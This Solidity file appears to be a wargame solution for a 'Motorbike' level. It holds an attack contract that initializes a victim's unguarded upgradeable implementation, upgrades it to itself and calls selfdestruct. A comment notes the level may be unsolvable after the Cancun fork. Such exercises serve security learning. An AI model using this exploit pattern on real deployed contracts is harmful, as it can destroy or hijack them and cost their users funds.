// SPDX-License-Identifier: MIT
// way to get implementation contract: cast storage 0xd031034c18de67....contract 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC


//I believe this level is unsolvable, we cannot selfdestruct the contract after the cancun fork.
pragma solidity ^0.8.0;
import {Engine} from "./Motorbike.sol";

contract MotorbikeAttack {
    Engine engine;

    constructor(address _victim) payable {
        engine = Engine(_victim);
        
    }
    function attack() external {
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

